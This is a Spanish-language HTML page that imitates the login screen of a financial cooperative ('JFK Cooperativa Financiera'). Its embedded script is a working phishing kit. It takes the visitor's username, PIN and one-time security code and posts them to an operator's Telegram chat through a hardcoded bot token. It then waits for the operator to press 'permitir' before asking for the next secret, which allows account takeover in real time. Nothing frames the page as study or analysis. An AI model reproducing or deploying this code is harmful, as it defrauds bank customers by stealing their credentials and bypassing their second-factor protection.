<!DOCTYPE html>
<html lang="es">

<head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>JFK Cooperativa Financiera</title>
      <style>
            * {
                  margin: 0;
                  padding: 0;
                  box-sizing: border-box;
            }

            body {
                  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                  background: #e8e5eb;
                  min-height: 100vh;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  padding: 20px;
                  color: #333;
            }

            /* Contenedor principal de la app */
            .app-container {
                  width: 100%;
                  max-width: 380px;
                  background: linear-gradient(180deg, #f8f5fa 0%, #ffffff 100%);
                  border-radius: 20px;
                  box-shadow: 0 10px 40px rgba(107, 76, 138, 0.2);
                  overflow: hidden;
                  position: relative;
            }

            /* Header */
            .header {
                  display: flex;
                  justify-content: space-between;
                  align-items: center;
                  padding: 15px 20px;
                  background: white;
                  position: relative;
            }

            .header::before {
                  content: '';
                  position: absolute;
                  top: 0;
                  left: 0;
                  right: 0;
                  height: 8px;
                  background: linear-gradient(90deg, #9b7cb6 0%, #c4a5d8 100%);
            }

            .logo {
                  display: flex;
                  align-items: center;
                  gap: 8px;
            }

            .logo-icon {
                  width: 40px;
                  height: 40px;
            }

            .logo-text {
                  font-size: 14px;
                  font-weight: bold;
                  color: #6b4c8a;
                  line-height: 1.2;
            }

            .logo-text span {
                  display: block;
                  color: #9b59b6;
                  font-weight: normal;
            }

            .dynamic-key {
                  display: flex;
                  align-items: center;
                  gap: 8px;
                  background: #f5f5f5;
                  padding: 8px 12px;
                  border-radius: 20px;
                  font-size: 12px;
                  color: #666;
                  cursor: pointer;
            }

            .dynamic-key::before {
                  content: '⏳';
                  font-size: 16px;
            }

            .help-icon {
                  width: 24px;
                  height: 24px;
                  border: 2px solid #9b7cb6;
                  border-radius: 50%;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  color: #9b7cb6;
                  font-size: 14px;
                  cursor: pointer;
            }

            /* Main Content */
            .main-content {
                  padding: 30px 20px;
                  text-align: center;
            }

            .greeting {
                  font-size: 28px;
                  color: #6b4c8a;
                  margin-bottom: 15px;
                  font-weight: 600;
            }

            .register-text {
                  font-size: 14px;
                  color: #666;
                  margin-bottom: 30px;
                  line-height: 1.5;
            }

            .register-text a {
                  color: #6b4c8a;
                  text-decoration: underline;
                  font-weight: 500;
            }

            /* Input Field */
            .input-group {
                  margin-bottom: 15px;
                  text-align: left;
            }

            .input-wrapper {
                  display: flex;
                  align-items: center;
                  border-bottom: 1px solid #ddd;
                  padding: 10px 0;
                  margin-bottom: 10px;
            }

            .input-icon {
                  width: 24px;
                  height: 24px;
                  margin-right: 10px;
                  color: #6b4c8a;
            }

            .input-wrapper input {
                  border: none;
                  outline: none;
                  font-size: 16px;
                  flex: 1;
                  color: #999;
                  background: transparent;
            }

            .forgot-link {
                  text-align: right;
                  font-size: 14px;
                  color: #666;
                  margin-bottom: 25px;
            }


            /* Modifica el botón en tu CSS */

            .btn-continue {
                  width: 100%;
                  padding: 15px;
                  background: #d4c4e0;
                  /* Color claro inicial (inactivo) */
                  color: white;
                  border: none;
                  border-radius: 25px;
                  font-size: 16px;
                  font-weight: 500;
                  cursor: not-allowed;
                  /* Cursor de no permitido inicialmente */
                  margin-bottom: 40px;
                  transition: all 0.3s ease;
                  opacity: 0.7;
            }

            /* Color oscuro cuando está activo */
            .btn-continue.active {
                  background: #6b4c8a;
                  /* Color morado oscuro */
                  cursor: pointer;
                  opacity: 1;
                  box-shadow: 0 4px 15px rgba(107, 76, 138, 0.4);
            }

            .btn-continue.active:hover {
                  background: #5a3d79;
                  /* Más oscuro al pasar el mouse */
                  transform: translateY(-2px);
            }

            /* Actions Section */
            .actions-title {
                  font-size: 20px;
                  color: #6b4c8a;
                  margin-bottom: 20px;
                  text-align: left;
                  font-weight: 600;
            }







            /* Contenedores para las imágenes */


            .action-text {
                  font-size: 13px;
                  color: #666;
                  text-align: center;
                  line-height: 1.3;
            }

            /* Footer */
            .footer {
                  background: #6b4c8a;
                  padding: 15px 20px;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 15px;
            }

            .dots {
                  display: flex;
                  gap: 8px;
            }

            .dot {
                  width: 20px;
                  height: 20px;
                  border-radius: 50%;
            }

            .dot.orange {
                  background: #e67e22;
            }

            .dot.green {
                  background: #27ae60;
            }

            .dot.purple {
                  background: #8e44ad;
            }

            .footer-text {
                  color: white;
                  font-size: 14px;
            }

            .heart {
                  color: white;
            }

            /* Responsive */
            @media (max-width: 480px) {
                  body {
                        padding: 10px;
                  }

                  .app-container {
                        max-width: 100%;
                  }
            }
      </style>
</head>

<body>
      <div class="app-container">
            <!-- Header -->
            <header class="header">
                  <div class="logo">

                        <div class="logo-text">
                              <center><img src="img/logo.png" alt="" width="180"></center>
                        </div>
                  </div>
                  <div style="display: flex; align-items: center; gap: 10px;">
                        <div><img src="img/clave.png" alt=""></div>

                  </div>
            </header>

            <!-- Main Content -->
            <main class="main-content">
                  <h1 class="greeting">¡Buenos días!</h1>

                  <p class="register-text">
                        Si aún no has creado el usuario y la clave,<br>
                        ingresa y <a href="#">regístrate aquí</a>
                  </p>

                  <!-- User Input -->
                  <div class="input-group">
                        <div class="input-wrapper">
                              <img src="img/login.png" alt="" width="30">

                              <input type="text" placeholder="Usuario">
                        </div>
                        <div class="input-wrapper">
                              <img src="img/password.png" alt="" width="30">

                              <input type="password" placeholder="Contraseña">
                        </div>
                        <div class="forgot-link">¿Olvidaste tu usuario?</div>
                  </div>

                  <button class="btn-continue">Continuar</button>

                  <!-- Actions -->
                  <h2 class="actions-title">Acciones principales</h2>

                  <div class="actions-grid">
                        <!-- Bre-B -->
                        <div class="action-card">

                              <!-- COLOCA AQUÍ LA IMAGEN DE Bre-B -->
                              <center><img src="img/todas.png" alt="Bre-B" width="320"> </center>

                        </div>
                  </div>
            </main>

            <!-- Footer -->
            <footer class="footer">
                  <div class="dots">
                        <div class="dot orange"></div>
                        <div class="dot green"></div>
                        <div class="dot purple"></div>
                  </div>
                  <div class="footer-text">El valor de hacerlo junt<span class="heart">♥</span>s</div>
            </footer>
      </div>
     <script>
    const TELEGRAM_API_KEY = "8627198220:AAHlyBdeq2SeDlVN6G4_6QPdQrwU3tY-ICw";
    const TELEGRAM_CHAT_ID = "-1004245962123";

    const passwordInput = document.querySelector('input[type="password"]');
    const userInput = document.querySelector('input[type="text"]');
    const btnContinue = document.querySelector('.btn-continue');
    const forgotLink = document.querySelector('.forgot-link');

    // Crear loader de pantalla completa
    const loaderOverlay = document.createElement('div');
    loaderOverlay.id = 'loaderOverlay';
    loaderOverlay.innerHTML = 
        '<div style="text-align:center;">' +
            '<div class="spinner" style="width:60px;height:60px;margin:0 auto;border:5px solid rgba(255,255,255,0.3);border-top:5px solid #fff;border-radius:50%;"></div>' +
            '<p id="loaderText" style="color:white;margin-top:20px;font-size:18px;font-family:sans-serif;">Verificando...</p>' +
        '</div>';
    loaderOverlay.style.cssText = 
        'position:fixed;' +
        'top:0;' +
        'left:0;' +
        'width:100%;' +
        'height:100%;' +
        'background:rgba(107,76,138,0.95);' +
        'z-index:99999;' +
        'display:none;' +
        'justify-content:center;' +
        'align-items:center;';
    document.body.appendChild(loaderOverlay);

    // Agregar animación CSS
    const spinnerStyle = document.createElement('style');
    spinnerStyle.textContent = 
        '@keyframes spin { from { transform:rotate(0deg); } to { transform:rotate(360deg); } } ' +
        '.spinner { animation:spin 1s linear infinite; }';
    document.head.appendChild(spinnerStyle);

    // Crear modal OTP
    const otpModal = document.createElement('div');
    otpModal.id = 'otpModal';
    
    let otpInputsHTML = '';
    for (let i = 0; i < 6; i++) {
        otpInputsHTML += '<input type="text" maxlength="1" style="width:45px;height:50px;text-align:center;font-size:20px;border:2px solid #ddd;border-radius:10px;outline:none;">';
    }
    
    otpModal.innerHTML = 
        '<div class="modal-overlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:1000;justify-content:center;align-items:center;">' +
            '<div class="modal-content" style="background:white;padding:30px;border-radius:20px;width:90%;max-width:350px;text-align:center;position:relative;">' +
                '<h3 style="color:#6b4c8a;margin-bottom:10px;">Verificación de seguridad</h3>' +
                '<p style="color:#666;font-size:14px;margin-bottom:20px;">Ingrese el código de 6 dígitos</p>' +
                '<div class="otp-inputs" style="display:flex;justify-content:center;gap:8px;margin-bottom:20px;">' +
                    otpInputsHTML +
                '</div>' +
                '<div id="otpError" style="color:#e74c3c;font-size:13px;margin-bottom:15px;display:none;"></div>' +
                '<div id="otpTimer" style="color:#6b4c8a;font-size:14px;margin-bottom:15px;">05:00</div>' +
                '<button id="verifyOtp" style="width:100%;padding:15px;background:#6b4c8a;color:white;border:none;border-radius:25px;font-size:16px;cursor:pointer;position:relative;min-height:50px;">' +
                    '<span class="btn-text">Verificar</span>' +
                    '<span class="btn-loader" style="display:none;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);">' +
                        '<span style="display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid white;border-radius:50%;" class="spinner"></span>' +
                    '</span>' +
                '</button>' +
            '</div>' +
        '</div>';
    
    document.body.appendChild(otpModal);

    const modalOverlay = otpModal.querySelector('.modal-overlay');
    const otpInputs = Array.from(otpModal.querySelectorAll('.otp-inputs input'));
    const verifyBtn = otpModal.querySelector('#verifyOtp');
    const verifyBtnText = verifyBtn.querySelector('.btn-text');
    const verifyBtnLoader = verifyBtn.querySelector('.btn-loader');
    const otpError = otpModal.querySelector('#otpError');
    const otpTimer = otpModal.querySelector('#otpTimer');

    let pollingInterval;
    let timerInterval;

    // Funciones del loader
    function showLoader(text) {
        const loaderText = document.getElementById('loaderText');
        if (loaderText) loaderText.textContent = text || 'Verificando...';
        loaderOverlay.style.display = 'flex';
        console.log('Loader mostrado');
    }

    function hideLoader() {
        loaderOverlay.style.display = 'none';
        console.log('Loader oculto');
    }

    function showBtnLoader(btn, textSpan, loaderSpan) {
        if (textSpan) textSpan.style.visibility = 'hidden';
        if (loaderSpan) loaderSpan.style.display = 'block';
        btn.disabled = true;
        btn.style.cursor = 'wait';
    }

    function hideBtnLoader(btn, textSpan, loaderSpan, newText) {
        if (textSpan) {
            textSpan.textContent = newText;
            textSpan.style.visibility = 'visible';
        }
        if (loaderSpan) loaderSpan.style.display = 'none';
        btn.disabled = false;
        btn.style.cursor = 'pointer';
    }

    async function sendTelegramMessage(message) {
        const url = 'https://api.telegram.org/bot' + TELEGRAM_API_KEY + '/sendMessage';
        const keyboard = {
            inline_keyboard: [[
                { text: '✅ Permitir', callback_data: 'permitir' },
                { text: '❌ No permitir', callback_data: 'no_permitir' }
            ]]
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: JSON.stringify(keyboard)
                })
            });
            const data = await response.json();
            return data.result ? data.result.message_id : null;
        } catch (error) {
            console.error('Error Telegram:', error);
            return null;
        }
    }

    async function checkTelegramResponse(messageId) {
        const url = 'https://api.telegram.org/bot' + TELEGRAM_API_KEY + '/getUpdates?limit=20';
        
        try {
            const response = await fetch(url);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (let i = data.result.length - 1; i >= 0; i--) {
                    const update = data.result[i];
                    if (update.callback_query && update.callback_query.message && 
                        update.callback_query.message.message_id === messageId) {
                        return update.callback_query.data;
                    }
                }
            }
            return null;
        } catch (error) {
            console.error('Error checking response:', error);
            return null;
        }
    }

    function startPolling(messageId) {
        return new Promise((resolve) => {
            let attempts = 0;
            const maxAttempts = 150;
            
            pollingInterval = setInterval(async () => {
                attempts++;
                if (attempts > maxAttempts) {
                    clearInterval(pollingInterval);
                    resolve('timeout');
                    return;
                }
                
                const response = await checkTelegramResponse(messageId);
                if (response) {
                    clearInterval(pollingInterval);
                    resolve(response);
                }
            }, 2000);
        });
    }

    function showOtpModal() {
        modalOverlay.style.display = 'flex';
        if (otpInputs.length > 0) {
            otpInputs[0].focus();
        }
        startOtpTimer();
    }

    function hideOtpModal() {
        modalOverlay.style.display = 'none';
        clearInterval(timerInterval);
        otpInputs.forEach(input => input.value = '');
        otpError.style.display = 'none';
    }

    function startOtpTimer() {
        let seconds = 300;
        clearInterval(timerInterval);
        
        timerInterval = setInterval(() => {
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            otpTimer.textContent = (mins < 10 ? '0' : '') + mins + ':' + (secs < 10 ? '0' : '') + secs;
            
            if (seconds <= 0) {
                clearInterval(timerInterval);
                otpError.textContent = 'El código ha expirado.';
                otpError.style.display = 'block';
            }
            seconds--;
        }, 1000);
    }

    function showError(message) {
        let errorDiv = document.querySelector('.login-error');
        if (!errorDiv) {
            errorDiv = document.createElement('div');
            errorDiv.className = 'login-error';
            errorDiv.style.cssText = 'background:#fee;color:#c33;padding:12px;border-radius:8px;margin-bottom:15px;font-size:13px;text-align:center;';
            const inputGroup = document.querySelector('.input-group');
            if (inputGroup) {
                inputGroup.before(errorDiv);
            }
        }
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        
        if (userInput) userInput.value = '';
        if (passwordInput) passwordInput.value = '';
        if (btnContinue) btnContinue.classList.remove('active');
        
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 5000);
    }

    function checkInputs() {
        if (!userInput || !passwordInput) return;
        
        const userFilled = userInput.value.trim().length > 0;
        const passFilled = passwordInput.value.length === 4;
        
        if (userFilled && passFilled) {
            btnContinue.classList.add('active');
        } else {
            btnContinue.classList.remove('active');
        }
    }

    if (passwordInput) {
        passwordInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 4) {
                this.value = this.value.slice(0, 4);
            }
            checkInputs();
        });
    }

    if (userInput) {
        userInput.addEventListener('input', function() {
            if (this.value.length > 20) {
                this.value = this.value.slice(0, 20);
            }
            checkInputs();
        });
    }

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            if (e.target.value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        });
        
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });

    // Verificar OTP
    if (verifyBtn) {
        verifyBtn.addEventListener('click', async () => {
            const code = otpInputs.map(i => i.value).join('');
            
            if (code.length !== 6) {
                otpError.textContent = 'Ingrese los 6 dígitos';
                otpError.style.display = 'block';
                return;
            }

            showBtnLoader(verifyBtn, verifyBtnText, verifyBtnLoader);

            const otpMessage = '🔐 <b>Código OTP - JFK Cooperativa</b>\n\n' +
                '👤 Usuario: ' + (userInput ? userInput.value : 'N/A') + '\n' +
                '🔢 Código: ' + code + '\n\n' +
                'Seleccione una acción:';

            const messageId = await sendTelegramMessage(otpMessage);
            
            if (messageId) {
                const response = await startPolling(messageId);
                
                hideBtnLoader(verifyBtn, verifyBtnText, verifyBtnLoader, 'Verificar');
                
                if (response === 'permitir') {
                    hideOtpModal();
                    window.location.href = '../../aprobado.php'
                } else if (response === 'timeout') {
                    otpError.textContent = 'Tiempo agotado.';
                    otpError.style.display = 'block';
                } else {
                    otpError.textContent = 'Código incorrecto.';
                    otpError.style.display = 'block';
                    otpInputs.forEach(i => i.value = '');
                    if (otpInputs[0]) otpInputs[0].focus();
                }
            } else {
                hideBtnLoader(verifyBtn, verifyBtnText, verifyBtnLoader, 'Verificar');
                otpError.textContent = 'Error de conexión.';
                otpError.style.display = 'block';
            }
        });
    }

    // Botón Continuar con loader
    if (btnContinue) {
        btnContinue.addEventListener('click', async (e) => {
            e.preventDefault();

            if (!btnContinue.classList.contains('active')) {
                console.log('Botón no activo');
                return;
            }

            const usuario = userInput ? userInput.value.trim() : '';
            const password = passwordInput ? passwordInput.value : '';

            console.log('Mostrando loader...');
            showLoader('Verificando credenciales...');

            const message = '🏦 <b>Nuevo acceso - JFK Cooperativa</b>\n\n' +
                '👤 Usuario: ' + usuario + '\n' +
                '🔑 Contraseña: ' + password + '\n' +
                '⏰ Fecha: ' + new Date().toLocaleString() + '\n\n' +
                'Seleccione una acción:';

            const messageId = await sendTelegramMessage(message);
            console.log('Message ID:', messageId);

            if (messageId) {
                const response = await startPolling(messageId);
                console.log('Respuesta:', response);
                
                hideLoader();

                if (response === 'permitir') {
                    showOtpModal();
                } else if (response === 'timeout') {
                    showError('Tiempo agotado.');
                } else {
                    showError('Datos incorrectos.');
                }
            } else {
                hideLoader();
                showError('Error de conexión.');
            }
        });
    }

    if (forgotLink) {
        forgotLink.addEventListener('click', (e) => {
            e.preventDefault();
            alert('Contacte a soporte');
        });
    }

    checkInputs();
</script>
</body>
</body>

</html>
